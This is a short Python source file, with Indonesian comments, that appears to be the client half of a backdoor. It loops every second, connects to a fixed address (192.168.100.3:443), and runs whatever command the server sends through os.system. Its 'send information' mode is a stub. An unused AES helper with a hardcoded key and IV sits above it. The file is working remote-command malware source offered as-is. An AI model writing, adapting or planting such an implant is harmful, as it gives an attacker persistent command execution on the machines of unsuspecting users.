from Crypto.Cipher import AES



#module jangan di encrypt


class crypto:
    def __init__(self):
        key = '6543210987654321'
        iv = '1234567890123456'
        self.aes = AES.new(key, AES.MODE_CBC, iv)
    def encrypt(self, data):
        self.data = data.encode('utf-8')
        if (len(self.data) % 16 != 0):
            while True:
                
                if (len(self.data) % 16 == 0):
                    break
                
                self.data += b'\0'
        hasil = self.aes.encrypt(self.data)
        return hasil
    def decrypt(self, data):
        self.data = data
        hasil1 = self.aes.decrypt(self.data)
        hasil1 = hasil1.rstrip(b'\0')
        hasil1 = hasil1.decode('utf-8')
        return hasil1


import time
import socket
import os
import platform
from threading import Thread    
class connector:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip, self.port = "192.168.100.3", 443
    def conn(self):
        try:
            self.sock.connect((self.ip, self.port))
            self.sock.send("comm oke".encode('utf-8'))
            command = self.sock.recv(4096).decode('utf-8').split()
            #mode 0 == run shell command
            try:
                if command[0] == "0":
                 try:
                     commander = command[1].replace("-", " ")
                     os.system(commander)
                     self.sock.send("out = success run command".encode("utf-8"))
                     self.sock.close()
                     return
                 except:
                     pass
                 #mode 1 kirim informasi
                if command[0] == "1":
                    try:
                        pass
                        self.sock.close()
                        return
                    except:
                        pass
                    
            except:
                pass
            self.sock.close()
        except:
            pass
    
    def run(self):
        self.conn()

                   
while True:        
 connector().run()
 time.sleep(1)